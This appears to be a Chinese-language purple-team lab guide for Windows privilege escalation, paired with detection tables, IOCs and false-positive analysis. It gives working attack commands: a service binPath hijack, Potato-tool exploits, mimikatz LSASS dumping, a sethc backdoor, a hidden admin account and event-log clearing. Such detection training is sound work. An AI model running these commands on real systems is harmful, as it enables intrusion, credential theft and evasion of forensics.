# 场景4：权限提升 (Privilege Escalation)

## ATT&CK 映射

| 字段 | 值 |
|------|-----|
| 战术 | Privilege Escalation (权限提升) |
| 技术 | T1068 - Exploitation for Privilege Escalation (利用漏洞提权) |
| 相关技术 | T1548.002 (Bypass User Account Control), T1543.003 (Windows Service), T1055 (Process Injection) |

## 场景描述

攻击者在 WIN10-01 上以普通用户 jdoe 登录（非管理员），通过以下两种方式实现权限提升：
1. **服务权限配置错误（T1543.003）**：发现一个 Windows 服务的可执行文件路径可被普通用户修改，替换为恶意程序后重启服务获得 SYSTEM 权限
2. **JuicyPotato（T1068）**：利用 SeImpersonatePrivilege 权限，通过 COM 接口欺骗获得 SYSTEM 权限

## 攻击拓扑

```
WIN10-01 (192.168.56.30)
┌─────────────────────────────────────┐
│  jdoe (普通用户, SeImpersonatePriv) │
│         │                            │
│         │ 1. 枚举服务权限            │
│         │ 2. 替换服务可执行文件      │
│         │ 3. 重启服务                │
│         ▼                            │
│  SYSTEM (服务上下文)                  │
│         │                            │
│         │ 4. 创建管理员用户          │
│         │ 5. 转储 LSASS 凭证         │
│         ▼                            │
│  Domain Admin (通过 PtH 到 DC01)     │
└─────────────────────────────────────┘
```

## 检测要点

| 数据源 | Event ID | 检测逻辑 |
|--------|----------|----------|
| Sysmon | 1 | 普通用户启动的进程修改服务可执行文件（icacls/sc config） |
| Sysmon | 11 | 服务目录下的可执行文件被覆盖/替换 |
| Windows 安全日志 | 4697 | 服务配置修改（binPath 变更） |
| Windows 安全日志 | 4688 | services.exe 派生的进程执行异常命令（如 cmd.exe /c net user） |
| Sysmon | 1 | JuicyPotato.exe / PrintSpoofer.exe / GodPotato.exe 进程创建 |
| Sysmon | 3 | 到 127.0.0.1 的 RPC 连接（COM 提权特征） |
| Windows 安全日志 | 4672 | 普通用户进程突然使用 SYSTEM 特权 |
| Wazuh FIM | - | 服务可执行文件的哈希变更 |

## 操作步骤

### 方法1：服务权限配置错误提权

#### 步骤1：枚举系统服务权限

在 WIN10-01 上以 jdoe（普通用户）执行：

```powershell
# 使用 accesschk 枚举服务权限（从 Sysinternals 下载）
.\accesschk.exe -uwcqv "Authenticated Users" *

# 或者使用 PowerShell 枚举
Get-WmiObject -Class Win32_Service | ForEach-Object {
    $service = $_.Name
    $path = $_.PathName
    $acl = Get-Acl $path -ErrorAction SilentlyContinue
    if ($acl) {
        $access = $acl.Access | Where-Object {
            $_.IdentityReference -match "Users|Authenticated Users|Everyone" -and
            $_.FileSystemRights -match "Write|Modify|FullControl"
        }
        if ($access) {
            Write-Host "脆弱服务: $service"
            Write-Host "  路径: $path"
            Write-Host "  权限: $($access.FileSystemRights)"
        }
    }
}
```

#### 步骤2：创建一个脆弱服务（模拟环境）

为了演示，我们先以管理员身份创建一个权限配置错误的服务：

```powershell
# 以管理员身份执行
# 创建一个测试服务
sc.exe create "VulnService" binPath= "C:\Program Files\VulnService\service.exe" start= auto

# 创建服务目录和占位文件
New-Item -ItemType Directory -Path "C:\Program Files\VulnService" -Force
Copy-Item C:\Windows\System32\notepad.exe "C:\Program Files\VulnService\service.exe"

# 故意设置错误的权限：允许普通用户修改
icacls "C:\Program Files\VulnService" /grant "Users:(OI)(CI)F" /T
```

#### 步骤3：普通用户替换服务可执行文件

切换回 jdoe（普通用户）：

```powershell
# 查看当前权限
whoami
whoami /priv

# 生成恶意程序（添加管理员用户）
# 方法1：使用 msfvenom
# 方法2：使用简单的 batch 文件重命名为 exe

# 创建一个添加管理员的批处理
@"
@echo off
net user privesc P@ssw0rd! /add
net localgroup Administrators privesc /add
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
"@ | Out-File -FilePath C:\temp\add_admin.bat -Encoding ASCII

# 使用 bat2exe 或直接复制 cmd.exe 作为服务
# 更简单：直接用 cmd.exe 替换，通过服务参数执行命令
copy C:\Windows\System32\cmd.exe "C:\Program Files\VulnService\service.exe" /Y

# 修改服务配置，添加命令参数
sc.exe config "VulnService" binPath= "C:\Program Files\VulnService\service.exe /c net user privesc P@ssw0rd! /add && net localgroup Administrators privesc /add"
```

#### 步骤4：重启服务触发提权

```powershell
# 停止服务
sc.exe stop "VulnService"

# 启动服务（以 SYSTEM 权限执行恶意命令）
sc.exe start "VulnService"

# 等待几秒
Start-Sleep -Seconds 3

# 验证提权成功
net user privesc
net localgroup Administrators
```

### 方法2：JuicyPotato 提权

#### 步骤1：检查 SeImpersonatePrivilege

```powershell
# 检查当前用户权限
whoami /priv

# 如果 SeImpersonatePrivilege 显示为 Disabled，需要先启用
# 通常服务账号（如 IIS AppPool、MSSQL）默认有此权限
```

#### 步骤2：下载并执行 JuicyPotato

```powershell
# 下载 JuicyPotato（从 GitHub）
# https://github.com/ohpe/juicy-potato/releases

# 创建恶意脚本（添加管理员）
@"
@echo off
net user juicypotato P@ssw0rd! /add
net localgroup Administrators juicypotato /add
"@ | Out-File -FilePath C:\temp\jp.bat -Encoding ASCII

# 执行 JuicyPotato
.\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c C:\temp\jp.bat" -l 1337

# 参数说明：
# -t * : 创建进程模拟
# -p : 要执行的程序
# -a : 程序参数
# -l : COM 服务器监听端口
```

#### 步骤3：使用 PrintSpoofer（替代方案，更稳定）

```powershell
# PrintSpoofer 利用打印服务的权限
# https://github.com/itm4n/PrintSpoofer

# 32位系统
.\PrintSpoofer.exe -i -c cmd.exe

# 64位系统
.\PrintSpoofer64.exe -i -c "C:\Windows\System32\cmd.exe /c C:\temp\jp.bat"
```

#### 步骤4：使用 GodPotato（最新，支持 Windows 11）

```powershell
# GodPotato 利用 DCOM 的权限
# https://github.com/BeichenDream/GodPotato

.\GodPotato.exe -cmd "cmd /c C:\temp\jp.bat"
```

### 步骤5：提权后的后渗透操作

获得 SYSTEM 权限后：

```cmd
:: 查看当前权限
whoami
whoami /priv

:: 转储 LSASS 凭证（为 PtH 做准备）
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > C:\temp\creds.txt

:: 或者使用 procdump
.\procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp

:: 创建隐藏的管理员用户
net user hidden$ P@ssw0rd! /add
net localgroup Administrators hidden$ /add

:: 修改注册表启用 RDP 后门
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

:: 清除日志（反取证）
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
```

## 预期日志与告警

### Windows 安全日志（WIN10-01）

| Event ID | 说明 |
|----------|------|
| 4697 | 服务配置修改（VulnService 的 binPath 变更） |
| 4688 | services.exe 派生 cmd.exe，命令行含 `net user` |
| 4720 | 用户账户创建（privesc, juicypotato） |
| 4732 | 成员添加到本地管理员组 |
| 4672 | 普通用户进程使用特殊权限 |
| 4688 | JuicyPotato.exe / PrintSpoofer.exe 进程创建 |

### Sysmon 日志（WIN10-01）

| Event ID | 说明 |
|----------|------|
| 11 | service.exe 被覆盖（C:\Program Files\VulnService\） |
| 1 | cmd.exe 进程创建，父进程 services.exe |
| 1 | JuicyPotato.exe 进程创建 |
| 3 | 到 127.0.0.1:1337 的 TCP 连接（COM 提权） |
| 3 | 到 127.0.0.1:135 的 RPC 连接 |
| 13 | 注册表修改（IFEO 调试器、RDP 启用） |
| 1 | net.exe 进程创建，命令行含 `user /add` |

### Wazuh 告警

- 规则 ID 18106：Windows 登录失败
- 自定义规则：服务可执行文件被修改
- 自定义规则：普通用户创建管理员账户
- 自定义规则：可疑提权工具执行

## IOC（失陷指标）

| 类型 | 值 |
|------|-----|
| 进程名 | JuicyPotato.exe, PrintSpoofer.exe, GodPotato.exe |
| 服务名 | VulnService（示例） |
| 服务路径异常 | binPath 含 `cmd.exe /c` 或 `net user` |
| 新建用户 | privesc, juicypotato, hidden$ |
| 网络连接 | 127.0.0.1:1337, 127.0.0.1:135 (RPC) |
| 注册表修改 | IFEO\sethc.exe Debugger, Terminal Server fDenyTSConnections |
| 文件修改 | C:\Program Files\VulnService\service.exe 哈希变更 |
| 命令行 | `net user * /add`, `net localgroup Administrators * /add` |

## 误报分析

- 合法软件更新：服务可执行文件被更新，但有数字签名，发布者可信
- 管理员手动创建用户：有对应的 4624 管理员登录事件前置
- 服务配置变更：有变更管理记录，通常在工作时段
- 打印服务正常运行：PrintSpooler 相关连接是正常的，但 PrintSpoofer 进程名异常
